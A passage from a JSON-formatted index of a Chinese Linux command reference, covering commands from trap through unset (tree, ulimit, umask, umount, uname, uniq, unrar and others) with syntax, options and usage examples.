`SIGHUP`：\n\n```shell\n$ trap \"rm $WORKDIR/work1 $WORKDIR/dataout; exit\" 1 2\n```\n\n### 2 忽略信号\n\n如果陷阱列出的命令是空的，指定的信号接收时，将被忽略：\n\n```shell\n$ trap '' 2\n```\n\n忽略多个信号：\n\n```shell\n$ trap '' 1 2 3 15\n```\n\n\n### 3 重置陷阱\n\n当你改变了收到信号后采取的动作，你可以省略第一个参数来重置到默认行为。\n\n```shell\n$ trap 1 2\n```\n\n\n### 注意\n\n1. `trap -l` 等价于执行 `kill -l`。\n2. 发送信号请查看 `kill` 命令。\n3. 该命令是bash内建命令，相关的帮助信息请查看 `help` 命令。\n4. 建议您阅读以下参考资料来深入了解该命令：\n\n- [GNU 官方手册： trap命令](https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html#index-trap)\n- [Linux Shell的信号trap功能你必须知道的细节](https://blog.csdn.net/elbort/article/details/8525599)\n- [阮一峰： Bash 脚本如何创建临时文件：mktemp 命令和 trap 命令教程](http://www.ruanyifeng.com/blog/2019/12/mktemp.html)\n- [【Bash百宝箱】shell内建命令之trap](https://blog.csdn.net/iEearth/article/details/52612557)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","trap"]},{"title":"【Linux 命令】tree","url":"/linux-command/tree/","content":"\n树状图列出目录的内容\n\n## 补充说明\n\n**tree命令** 以树状图列出目录的内容。\n\n### 语法\n\n```shell\ntree(选项)(参数)\n```\n\n### 选项\n\n```shell\n------- 列表选项 -------\n-a            # 显示所有文件和目录。\n-d            # 显示目录名称而非文件。\n-l            # 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。\n-f            # 在每个文件或目录之前，显示完整的相对路径名称。\n-x            # 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该目录予以排除在寻找范围外。\n-L level      # 限制目录显示层级。\n-R            # Rerun tree when max dir level reached.\n-P pattern    # <范本样式> 只显示符合范本样式的文件和目录名称。\n-I pattern    # Do not list files that match the given pattern.\n--ignore-case # Ignore case when pattern matching.\n--matchdirs   # Include directory names in -P pattern matching.\n--noreport    # Turn off file/directory count at end of tree listing.\n--charset X   # Use charset X for terminal/HTML and indentation line output.\n--filelimit # # Do not descend dirs with more than # files in them.\n--timefmt <f> # Print and format time according to the format <f>.\n-o filename   # Output to file instead of stdout.\n-------- 文件选项 ---------\n-q            # 用“？”号取代控制字符，列出文件和目录名称。\n-N            # 直接列出文件和目录名称，包括控制字符。\n-Q            # Quote filenames with double quotes.\n-p            # 列出权限标示。\n-u            # 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。\n-g            # 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。\n-s            # 列出文件和目录大小。\n-h            # Print the size in a more human readable way.\n--si          # Like -h, but use in SI units (powers of 1000).\n-D            # 列出文件或目录的更改时间。\n-F            # 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上\"*\"，\"/\"，\"@\"，\"|\"号。\n--inodes      # Print inode number of each file.\n--device      # Print device ID number to which each file belongs.\n------- 排序选项 -------\n-v            # Sort files alphanumerically by version.\n-t            # 用文件和目录的更改时间排序。\n-c            # Sort files by last status change time.\n-U            # Leave files unsorted.\n-r            # Reverse the order of the sort.\n--dirsfirst   # List directories before files (-U disables).\n--sort X      # Select sort: name,version,size,mtime,ctime.\n------- 图形选项 ------\n-i            # 不以阶梯状列出文件和目录名称。\n-A            # 使用ASNI绘图字符显示树状图而非以ASCII字符组合。\n-S            # Print with CP437 (console) graphics indentation lines.\n-n            # Turn colorization off always (-C overrides).\n-C            # 在文件和目录清单加上色彩，便于区分各种类型。\n------- XML / HTML / JSON选项 -------\n-X            # Prints out an XML representation of the tree.\n-J            # Prints out an JSON representation of the tree.\n-H baseHREF   # Prints out HTML format with baseHREF as top directory.\n-T string     # Replace the default HTML title and H1 header with string.\n--nolinks     # Turn off hyperlinks in HTML output.\n---- 杂项选项 ----\n--version     # 输入版本信息。\n--help        # 打印使用帮助信息。\n--            # Options processing terminator.\n```\n\n### 参数\n\n目录：执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。\n\n\n### 实例\n\n列出目录`/private/` 第一级文件名\n\n```shell\ntree  /private/ -L 1\n/private/\n├── etc\n├── tftpboot\n├── tmp\n└── var\n```\n\n忽略文件夹\n\n```shell\ntree -I node_modules # 忽略当前目录文件夹node_modules\ntree -P node_modules # 列出当前目录文件夹node_modules的目录结构\ntree -P node_modules -L 2 # 显示目录node_modules两层的目录树结构\ntree -L 2 > /home/www/tree.txt # 当前目录结果存到 tree.txt 文件中\n```\n\n忽略多个文件夹\n\n```shell\ntree -I 'node_modules|icon|font' -L 2\n```\n\n非树状结构列出目录`/private/`下的所有文件\n\n```\ntree -if /private/\n/private\n/private/a1\n/private/a2\n/private/etc\n/private/etc/b1\n/private/etc/b2\n/private/tftpboot\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tree"]},{"title":"【Linux 命令】true","url":"/linux-command/true/","content":"\n返回状态为成功。\n\n## 概要\n\n```shell\ntrue\n```\n\n## 主要用途\n\n- 用于和其他命令进行逻辑运算。\n\n## 返回值\n\n返回状态总是成功；返回值为0。\n\n## 例子\n\n```shell\n# 当你的脚本设置set -e时，任何返回值为失败的命令都会使得脚本退出。\nset -e\n# 如何临时跳过呢？下面的语句使用逻辑或操作符连接true，返回值一定为真。\nsome_command || true\n\n# 当然，和python的pass一样，也可以用作条件语句临时占位。\n```\n\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","true"]},{"title":"【Linux 命令】tty","url":"/linux-command/tty/","content":"\n显示连接到当前标准输入的终端设备文件名\n\n## 概要\n\n```shell\ntty [option] ...\n```\n\n## 主要用途\n\n- 显示连接到当前标准输入的终端设备文件名，当标准输入不是终端时打印 \"not a tty\"。\n\n## 选项\n\n```shell\n-s, --silent, --quiet    不打印任何信息，只返回退出状态。\n--help                   显示帮助信息并退出。\n--version                显示版本信息并退出。\n```\n\n## 返回值\n\n当使用 `-s, --silent, --quiet` 时，返回码为 0 表示标准输入是终端，返回码为 1 表示标准输入不是终端，返回码为 2 表示选项错误，返回码为 3 表示有写错误发生。\n\n## 例子\n\n显示连接到当前标准输入的终端设备文件名。\n\n```shell\n[root@localhost ~]# tty\n/dev/pts/2\n```\n\n查找终端关联的进程（假设是 pts/2）\n\n```shell\n# 注意是筛选 TTY 列。\nps -ef | egrep \"pts/2 \" | grep -v grep\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 tty`，`info coreutils 'tty invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tty"]},{"title":"【Linux 命令】type","url":"/linux-command/type/","content":"\n显示指定命令的类型。\n\n## 概要\n\n```shell\n type [-afptP] name [name ...]\n ```\n\n## 主要用途\n\n- 显示要查找的命令的信息。\n- 控制查找范围和行为。\n- 显示要查找的命令优先级最高的类型。\n\n## 选项\n\n```shell\n-a：在环境变量PATH中查找并显示所有包含name的可执行文件路径；当'-p'选项没有同时给出时，如果在别名、关键字，函数，内建的信息中存在name，则一并显示。\n-f：排除对shell函数的查找。\n-p：如果name在执行'type -t name'返回的不是'file'，那么什么也不返回；否则会在环境变量PATH中查找并返回可执行文件路径。\n-P：即使要查找的name是别名、内建、函数中的一个，仍然会在环境变量PATH中查找并返回可执行文件路径。\n-t：根据name的类型返回一个单词（别名，关键字，函数，内建，文件），否则返回空值。\n```\n\n## 参数\n\nname：要查找的命令，可以为多个。\n\n## 返回值\n\n当指定的命令可以找到时返回成功，如果有没找到的返回失败。\n\n## 例子\n\n```shell\n接下来要用到的例子假设'~/.bashrc'文件定义了以下的内容：\n\nalias ls='ls --color=auto'\nmybash(){ vim ~/.bashrc; }\n\n而且执行环境里没有使用enable禁用内建命令。\n```\n\n```shell\ntype -a mybash\n# 输出\nmybash is a function\nmybash ()\n{\n    vim ~/.bashrc\n}\n\ntype -a -f mybash\n# 输出（因为排除了函数，所以报错）\nbash: type: mybash: not found\n\ntype -a -p mybash\n# 输出为空（因为排除了函数，所以什么也不返回）\n\ntype -a ls\n# 输出\nls is aliased to `ls --color=suto'\nls is /usr/bin/ls\nls is /bin/ls\n\ntype -a -p ls\n# 输出\n/usr/bin/ls\n/bin/ls\n```\n\n```shell\n# '-f'不会影响'-P'的范围，'-f'不建议和'-p'使用。\n# 注意：printf同时是内建命令以及可执行文件（GNU coreutils），优先作为内建处理。\n\ntype -p printf\n# 输出为空\n\ntype -P printf\n# 输出\n/usr/bin/printf\n/bin/printf\n```\n\n```shell\n# 如果有多个类型，那么输出优先级最高的类型。\n\ntype -t ls\n# 输出\nalias\n\ntype -t for\n# 输出（bash关键字）\nkeyword\n\ntype -t mybash\n# 输出\nfunction\n\ntype -t -f mybash\n# 输出空值\n\ntype -t printf\n# 输出（bash内建优先级高）\nbuiltin\n\ntype -t chmod\n# 输出\nfile\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n2. 命令优先级问题请查看`builtin`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","type"]},{"title":"【Linux 命令】ulimit","url":"/linux-command/ulimit/","content":"\n控制shell程序的资源\n\n## 补充说明\n\n**ulimit命令** 用来限制系统用户对shell资源的访问。如果不懂什么意思，下面一段内容可以帮助你理解：\n\n假设有这样一种情况，当一台 Linux 主机上同时登陆了 10 个人，在系统资源无限制的情况下，这 10 个用户同时打开了 500 个文档，而假设每个文档的大小有 10M，这时系统的内存资源就会受到巨大的挑战。\n\n而实际应用的环境要比这种假设复杂的多，例如在一个嵌入式开发环境中，各方面的资源都是非常紧缺的，对于开启文件描述符的数量，分配堆栈的大 小，CPU 时间，虚拟内存大小，等等，都有非常严格的要求。资源的合理限制和分配，不仅仅是保证系统可用性的必要条件，也与系统上软件运行的性能有着密不可分的联 系。这时，ulimit 可以起到很大的作用，它是一种简单并且有效的实现资源限制的方式。\n\nulimit 用于限制 shell 启动进程所占用的资源，支持以下各种类型的限制：所创建的内核文件的大小、进程数据块的大小、Shell 进程创建文件的大小、内存锁住的大小、常驻内存集的大小、打开文件描述符的数量、分配堆栈的最大大小、CPU 时间、单个用户的最大线程数、Shell 进程所能使用的最大虚拟内存。同时，它支持硬资源和软资源的限制。\n\n作为临时限制，ulimit 可以作用于通过使用其命令登录的 shell 会话，在会话终止时便结束限制，并不影响于其他 shell 会话。而对于长期的固定限制，ulimit 命令语句又可以被添加到由登录 shell 读取的文件中，作用于特定的 shell 用户。\n\n### 语法\n\n```shell\nulimit(选项)\n```\n\n### 选项\n\n```shell\n-a：显示目前资源限制的设定；\n-c <core文件上限>：设定core文件的最大值，单位为区块；\n-d <数据节区大小>：程序数据节区的最大值，单位为KB；\n-e 默认进程优先级, 值越小优先级越高\n-f <文件大小>：shell所能建立的最大文件，单位为区块；\n-H：设定资源的硬性限制，也就是管理员所设下的限制；\n-m <内存大小>：指定可使用内存的上限，单位为KB；\n-n <文件数目>：指定同一时间最多可开启的文件数；\n-p <缓冲区大小>：指定管道缓冲区的大小，单位512字节；\n-s <堆叠大小>：指定堆叠的上限，单位为KB；\n-S：设定资源的弹性限制；\n-t <CPU时间>：指定CPU使用时间的上限，单位为秒；\n-u <程序数目>：用户最多可开启的程序数目；\n-v <虚拟内存大小>：指定可使用的虚拟内存上限，单位为KB。\n```\n\n### 实例\n\n```shell\n[root@localhost ~]# ulimit -a\ncore file size          (blocks, -c) 0           #core文件的最大值为100 blocks。\ndata seg size           (kbytes, -d) unlimited   #进程的数据段可以任意大。\nscheduling priority             (-e) 0\nfile size               (blocks, -f) unlimited   #文件可以任意大。\npending signals                 (-i) 98304       #最多有98304个待处理的信号。\nmax locked memory       (kbytes, -l) 32          #一个任务锁住的物理内存的最大值为32KB。\nmax memory size         (kbytes, -m) unlimited   #一个任务的常驻物理内存的最大值。\nopen files                      (-n) 1024        #一个任务最多可以同时打开1024的文件。\npipe size            (512 bytes, -p) 8           #管道的最大空间为4096字节。\nPOSIX message queues     (bytes, -q) 819200      #POSIX的消息队列的最大值为819200字节。\nreal-time priority              (-r) 0\nstack size              (kbytes, -s) 10240       #进程的栈的最大值为10240字节。\ncpu time               (seconds, -t) unlimited   #进程使用的CPU时间。\nmax user processes              (-u) 98304       #当前用户同时打开的进程（包括线程）的最大个数为98304。\nvirtual memory          (kbytes, -v) unlimited   #没有限制进程的最大地址空间。\nfile locks                      (-x) unlimited   #所能锁住的文件的最大个数没有限制。\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ulimit"]},{"title":"【Linux 命令】umask","url":"/linux-command/umask/","content":"\n显示或设置创建文件的权限掩码。\n\n## 概要\n\n```shell\numask [-p] [-S] [mode]\n```\n\n## 主要用途\n\n- 显示当前的文件权限掩码。\n- 通过八进制数的方式设置创建文件的权限掩码。\n- 通过符号组合的方式设置创建文件的权限掩码。\n\n## 参数\n\nmode（可选）：八进制数或符号组合。\n\n## 选项 \n\n```shell\n-p：当没有参数时指定该选项，执行产生的输出格式可复用为输入；\n-S：以符号组合的方式输出创建文件的权限掩码，不使用该选项时以八进制数的形式输出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子\n\n*以下的例子均假设文件权限掩码为0022。*\n\n```shell\n# 以八进制数的形式输出创建文件的权限掩码。\numask -p\n# 执行结果：\numask 0022\n# 以符号组合的方式输出创建文件的权限掩码。\numask -S\n# 执行结果：\nu=rwx,g=rx,o=rx\n```\n\n> 参考`man chmod`文档的`DESCRIPTION`段落得知：\n> - `u`符号代表当前用户。\n> - `g`符号代表和当前用户在同一个组的用户，以下简称组用户。\n> - `o`符号代表其他用户。\n> - `a`符号代表所有用户。\n> - `r`符号代表读权限以及八进制数`4`。\n> - `w`符号代表写权限以及八进制数`2`。\n> - `x`符号代表执行权限以及八进制数`1`。\n> - `+`符号代表添加目标用户相应的权限。\n> - `-`符号代表删除目标用户相应的权限。\n> - `=`符号代表添加目标用户相应的权限，删除未提到的权限。\n\n那么刚才以符号形式输出的结果`u=rwx,g=rx,o=rx`转化为八进制数等于`0755`；\n\n用八进制数来设置同样的权限，`umask`需要额外的执行减法`0777 - 0755`即`0022`，而`chmod`不需要。\n\n符号组合模式的添加、删除、赋值权限。\n\n```shell\n# 添加权限：\n# 为组用户添加写权限。\numask g+w\n# 删除权限：\n# 删除其他用户的写、执行权限\numask o-wx\n# 赋值权限：\n# 赋值全部用户所有权限，等价于umask u=rwx,g=rwx,o=rwx\numask a=rwx\n# 清除其他用户的读、写、执行权限。\numask o=\n```\n\n创建文件夹、文件（假设当前目录不存在）\n\n```shell\n# 创建文件\ntouch test.sh\n# 查看权限，发现执行权限的设置不起作用。\nstat test.sh\n# 创建文件夹\ntouch newdir\n# 查看权限，发现执行权限的设置可以起作用。\nstat newdir\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n2. `chmod`用于更改已有对象的权限，`umask`影响之后新建对象的权限。\n\n3. **请谨慎使用该命令**，特别是不要取消当前用户的读取权限，那样会导致你在终端使用`TAB`键补全时报错。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","umask"]},{"title":"【Linux 命令】umount","url":"/linux-command/umount/","content":"\n用于卸载已经加载的文件系统\n\n## 补充说明\n\n**umount命令** 用于卸载已经加载的文件系统。利用设备名或挂载点都能umount文件系统，不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。\n\n###  语法\n\n```shell\numount(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：卸除/etc/mtab中记录的所有文件系统；\n-h：显示帮助；\n-n：卸除时不要将信息存入/etc/mtab文件中；\n-r：若无法成功卸除，则尝试以只读的方式重新挂入文件系统；\n-t<文件系统类型>：仅卸除选项中所指定的文件系统；\n-v：执行时显示详细的信息；\n-V：显示版本信息。\n```\n\n###  参数\n\n文件系统：指定要卸载的文件系统或者其对应的设备文件名。\n\n###  实例\n\n下面两条命令分别通过设备名和挂载点卸载文件系统，同时输出详细信息：\n\n通过设备名卸载\n\n```shell\numount -v /dev/sda1\n/dev/sda1 umounted\n```\n\n通过挂载点卸载\n\n```shell\numount -v /mnt/mymount/\n/tmp/diskboot.img umounted\n```\n\n如果设备正忙，卸载即告失败。卸载失败的常见原因是，某个打开的shell当前目录为挂载点里的某个目录：\n\n```shell\numount -v /mnt/mymount/\numount: /mnt/mymount: device is busy\numount: /mnt/mymount: device is busy\n```\n\n有时，导致设备忙的原因并不好找。碰到这种情况时，可以用lsof列出已打开文件，然后搜索列表查找待卸载的挂载点：\n\n```shell\nlsof | grep mymount         查找mymount分区里打开的文件\nbash   9341  francois  cwd   DIR   8,1   1024    2 /mnt/mymount\n```\n\n从上面的输出可知，mymount分区无法卸载的原因在于，francois运行的PID为9341的bash进程。\n\n对付系统文件正忙的另一种方法是执行延迟卸载：\n\n```shell\numount -vl /mnt/mymount/     执行延迟卸载\n```\n\n延迟卸载（lazy unmount）会立即卸载目录树里的文件系统，等到设备不再繁忙时才清理所有相关资源。卸载可移动存储介质还可以用eject命令。下面这条命令会卸载cd并弹出CD：\n\n```shell\neject /dev/cdrom      卸载并弹出CD \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","umount"]},{"title":"【Linux 命令】unalias","url":"/linux-command/unalias/","content":"\n删除由alias设置的别名\n\n## 概要\n\n```shell\nunalias [-a] name [name ...]\n```\n\n## 主要用途\n\n- 删除一个或多个别名。\n- 删除全部已定义的别名。\n\n## 选项\n\n```shell\n-a：删除全部已定义的别名。\n```\n\n## 参数\n\nname：指定要删除的一个或多个已定义的别名。\n\n### 返回值\n\nunalias返回true除非您要删除的别名未定义。\n\n## 例子\n\n```shell\n# 删除全部已定义的别名\nunalias -a\n\n# 删除已定义的别名（假设当前环境存在以下别名）\nunalias vi\nunalias ls grep\n```\n\n## 错误用法\n\n- 要删除的别名未定义。\n\n- 不使用-a选项时没有传递name参数。\n\n\n### 注意\n\n1. **执行脚本时请注意：**\n\n> 使用`source`命令执行的bash脚本如果执行了`alias`或`unalias`命令，那么有可能会对终端环境的别名设置产生影响；终端环境的别名设置也可能改变运行结果；\n>\n> 通过`sh`方式调用的bash脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。\n\n2. 查看及设置别名，请查看`alias`命令。\n\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unalias"]},{"title":"【Linux 命令】uname","url":"/linux-command/uname/","content":"\n打印系统信息。\n\n## 概要\n\n```shell\nuname [OPTION]...\n```\n\n## 主要用途\n\n- 打印机器和操作系统的信息。\n- 当没有选项时，默认启用 `-s` 选项。\n- 如果给出多个选项或 `-a` 选项时，输出信息按以下字段排序：内核名称 主机名称 内核release 内核版本\n 机器名称 处理器 硬件平台 操作系统。\n\n## 选项\n\n```shell\n-a, --all                  按顺序打印全部信息，如果 -p 和 -i 的信息是未知，那么省略。\n-s, --kernel-name          打印内核名称。\n-n, --nodename             打印网络节点主机名称。\n-r, --kernel-release       打印内核release。\n-v, --kernel-version       打印内核版本。\n-m, --machine              打印机器名称。\n-p, --processor            打印处理器名称。\n-i, --hardware-platform    打印硬件平台名称。\n-o, --operating-system     打印操作系统名称。\n--help                     显示帮助信息并退出。\n--version                  显示版本信息并退出。\n```\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n# 单独使用uname命令时相当于uname -s\n[root@localhost ~]# uname\nLinux\n```\n\n```shell\n# 查看全部信息\n[root@localhost ~]# uname -a\nLinux localhost 2.6.18-348.6.1.el5 #1 SMP Tue May 21 15:34:22 EDT 2013 i686 i686 i386 GNU/Linux\n```\n\n```shell\n# 分别列出信息\n[root@localhost ~]# uname -m\ni686\n\n[root@localhost ~]# uname -n\nlocalhost\n\n[root@localhost ~]# uname -r\n2.6.18-4-686\n\n[root@localhost ~]# uname -s\nLinux\n\n[root@localhost ~]# uname -v\n#1 SMP Tue May 21 15:34:22 EDT 2013\n\n[root@localhost ~]# uname -p\ni686\n\n[root@localhost ~]# uname -i\ni386\n\n[root@localhost ~]# uname -o\nGNU/Linux\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 uname`，`info coreutils 'uname invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uname"]},{"title":"【Linux 命令】unarj","url":"/linux-command/unarj/","content":"\n解压缩由arj命令创建的压缩包\n\n## 补充说明\n\n**unarj命令** 用来解压缩由arj命令创建的压缩包。\n\n###  语法\n\n```shell\nunarj(选项)(参数)\n```\n\n###  选项\n\n```shell\ne：解压缩.arj文件；\nl：显示压缩文件内所包含的文件；\nt：检查压缩文件是否正确；\nx：解压缩时保留原有的路径。\n```\n\n###  参数\n\n.arj压缩包：指定要解压缩的.arj压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unarj"]},{"title":"【Linux 命令】uncompress","url":"/linux-command/uncompress/","content":"\n用来解压.Z文件\n\n## 补充说明\n\n**uncompress命令** 用来解压缩由compress命令压缩后产生的“.Z”压缩包。\n\n###  语法\n\n```shell\nuncompress(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f：不提示用户，强制覆盖掉目标文件；\n-c：将结果送到标准输出，无文件被改变；\n-r：递归的操作方式。\n```\n\n###  参数\n\n文件：指定要压缩的“.Z”压缩包。\n\n###  实例\n\n先创建一个.Z压缩文件\n\n```shell\ncompress FileName\n```\n\n解压：\n\n```shell\nuncompress FileName.Z\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uncompress"]},{"title":"【Linux 命令】unexpand","url":"/linux-command/unexpand/","content":"\n将文件的空白字符转换为制表符\n\n## 补充说明\n\n**unexpand命令** 用于将给定文件中的空白字符（space）转换为制表符（TAB），并把转换结果显示在标准输出设备（显示终端）。\n\n###  语法\n\n```shell\nunexpand(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a或--all：转换文件中所有的空白字符；\n--first-only：仅转换开头的空白字符；\n-t<N>：指定TAB所代表的N个（N为整数）字符数，默认N值是8。\n```\n\n###  参数\n\n文件：指定要转换空白为TAB的文件列表。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unexpand"]},{"title":"【Linux 命令】uniq","url":"/linux-command/uniq/","content":"\n显示或忽略重复的行。\n\n## 概要\n\n```shell\nuniq [OPTION]... [INPUT [OUTPUT]]\n```\n\n## 主要用途\n\n- 将输入文件（或标准输入）中邻近的重复行写入到输出文件（或标准输出）中。\n- 当没有选项时，邻近的重复行将合并为一个。\n\n\n## 选项\n\n```shell\n-c, --count                在每行开头增加重复次数。\n-d, --repeated             所有邻近的重复行只被打印一次。\n-D                         所有邻近的重复行将全部打印。\n--all-repeated[=METHOD]    类似于 -D，但允许每组之间以空行分割。METHOD取值范围{none(默认)，prepend，separate}。\n-f, --skip-fields=N        跳过对前N个列的比较。\n--group[=METHOD]           显示所有行，允许每组之间以空行分割。METHOD取值范围：{separate(默认)，prepend，append，both}。\n-i, --ignore-case          忽略大小写的差异。\n-s, --skip-chars=N         跳过对前N个字符的比较。\n-u, --unique               只打印非邻近的重复行。\n-z, --zero-terminated      设置行终止符为NUL（空），而不是换行符。\n-w, --check-chars=N        只对每行前N个字符进行比较。\n--help                     显示帮助信息并退出。\n--version                  显示版本信息并退出。\n```\n\n## 参数\n\nINPUT（可选）：输入文件，不提供时为标准输入。\n\nOUTPUT（可选）：输出文件，不提供时为标准输出。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n注意：命令2和命令3结果一样，命令1仅作了相邻行的去重。\n\n```shell\nuniq file.txt\nsort file.txt | uniq\nsort -u file.txt\n```\n\n只显示单一行，区别在于是否执行排序：\n\n```shell\nuniq -u file.txt\nsort file.txt | uniq -u\n```\n\n统计各行在文件中出现的次数：\n\n```shell\nsort file.txt | uniq -c\n```\n\n在文件中找出重复的行：\n\n```shell\nsort file.txt | uniq -d\n```\n\n\n### 注意\n\n1. `uniq`只检测邻近的行是否重复，`sort -u`将输入文件先排序然后再处理重复行。 \n\n2. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 uniq`，`info coreutils 'uniq invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","uniq"]},{"title":"【Linux 命令】unlink","url":"/linux-command/unlink/","content":"\n系统调用函数unlink去删除指定的文件\n\n## 补充说明\n\n**unlink命令** 用于系统调用函数unlink去删除指定的文件。和rm命令作用一样，都是删除文件。\n\n###  语法\n\n```shell\nunlink(选项)(参数)\n```\n\n###  选项\n\n```shell\n--help：显示帮助；\n--version：显示版本号。\n```\n\n###  参数\n\n文件：指定要删除的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unlink"]},{"title":"【Linux 命令】unprotoize","url":"/linux-command/unprotoize/","content":"\n删除C语言源代码文件中的函数原型\n\n## 补充说明\n\n**unprotoize命令** 属于gcc套件，用于删除C语言源代码文件中的函数原型。\n\n###  语法\n\n```shell\nunprotoize(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：设置需要转换代码的目录；\n-x：转换代码时排除的文件。\n```\n\n###  参数\n\n文件：需要转换代码的C语言源文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unprotoize"]},{"title":"【Linux 命令】unrar","url":"/linux-command/unrar/","content":"\n解压rar文件命令，从 rar 压缩包中提取文件\n\n###  语法\n\n```shell\nunrar [选项][switch 命令] [文件名...][路径]\nunrar <command> [-<switch 1> -<switch N>] archive [files...] [path...]\n```\n\n### 安装\n\n在 Linux 中输入以下命令下载安装包\n\n```shell\nwget https://www.rarlab.com/rar/rarlinux-6.0.2.tar.gz\n\ncd ~/Downloads/\ntar -zxvf rarlinux-6.0.2.tar.gz\n```\n\n###  选项\n\n```shell\ne             # 解压压缩文件到当前目录\nl[t,b]        # 列出压缩文件[技术信息,简洁]\np             # 将文件打印到标准输出。\nt             # 测试压缩文件\nv[t,b]        # 详细列出压缩文件[技术信息,简洁]\nx             # 用绝对路径解压文件\n```\n\n### SWITCHES  开关设置\n\n注意：每个开关必须用空格分隔。你不能把它们放在一起。\n       \n```shell\n-av-       # 禁用，真实性验证检查。\n-c-        # 禁用，评论显示\n-f         # 刷新文件\n-kb        # 保留破碎的提取文件\n-ierr      # 将所有消息发送给stderr。\n-inul      # 禁用，所有消息。\n-o+        # 覆盖现有文件。\n-o-        # 不要覆盖现有文件\n-p<password>\n     \t    # 设置密码。\n-p-        # 不查询密码\n-r         # 递归子目录。\n-u         # 更新文件。\n-v         # 列出所有卷。\n-x<file>\n     \t    # 排除指定的文件。\n-x@<list>\n     \t    # 排除指定列表文件中的文件。\n-x@        # 读取要从 stdin 中排除的文件名。\n-y         # 对所有查询都假设为是。\n```\n\n###  参数\n\n目录：指定要显示列表的目录，也可以是具体的文件。\n\n###  实例\n\n将压缩文件 `text.rar` 在当前目录下解压缩,并解压完整路径。\n\n```shell\nunrar x test.rar\n```\n\n将压缩文件 text.rar 在当前目录下解压缩,并解压完整路径：\n\n```shell\n[root@linux ~]# unrar x test.rar\n```\n\n查看rar包中的内容：\n\n```shell\n[root@linux ~]# unrar l test.rar\n```\n\n测试rar包是否能解压成功：\n\n```shell\n[root@linux ~]# unrar t test.rar\n```\n\n\n解压到当前文件夹：\n\n```shell\n[root@linux ~]# unrar e test.rar\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","unrar"]},{"title":"【Linux 命令】unset","url":"/linux-command/unset/","content":"\n删除指定的shell变量或函数。\n\n## 概要\n\n```shell\nunset [-f] [-v] [-n] [name ...]\n```\n\n## 主要用途\n\n- 删除一到多个shell变量（不包括只读变量）。\n- 删除一到多个shell函数。\n- 删除一到多个具有引用属性的变量（如果-n选项存在）。\n\n## 选项\n\n```shell\n-f：仅删除函数。\n-v：仅删除变量（不包括只读变量）。\n-n：删除具有引用属性的变量名（如果该选项存在）。\n```\n\n## 参数\n\nname（可选）：要删除的变量或函数。\n\n## 返回值\n\n返回成功除非选项错误或要删除的变量或函数有只读属性。\n\n## 例子\n\n```shell\n# 删除变量。\ndeclare paper_size='B5'\nunset -v paper_size\n```\n```shell\n# 删除函数。\nfunction show_result(){ echo 'Last Command Return: $?'; }\nunset -f show_result\n```\n```shell\n# 当不指定选项时，优先删除变量，如果失败则删除函数。\ndeclare -i aa=100\nfunction aa(){ echo 'aa'; }\nunset aa\n# 变量'aa'已被删除。\ndeclare -p aa\n# 函数'aa'存在。\ndeclare -F|grep aa\n```\n```shell\n# 演示unset使用-n选项，name指定了引用变量时的情况。\ndeclare a=3\n# 定义引用变量\ndeclare -n b=a\n# 查看属性，显示declare -n b=\"a\"\ndeclare -p b\n# 显示3\necho ${b}\n# 显示a\necho ${!b}\n# 指定-n选项时\nunset -n b\n# 引用变量b已被删除\ndeclare -p b\n# 被引用的变量a未被删除\ndeclare -p a\n```\n\n```shell\n# 演示unset不使用-n选项，name指定了引用变量时的情况。\ndeclare a=3\n# 定义引用变量\ndeclare -n b=a\n# 查看属性，显示declare -n b=\"a\"\ndeclare -p b\n# 显示3\necho ${b}\n# 显示a\necho ${!b}\n# 不指定-n选项时\nunset b\n# 引用变量b未被删除，显示declare -n 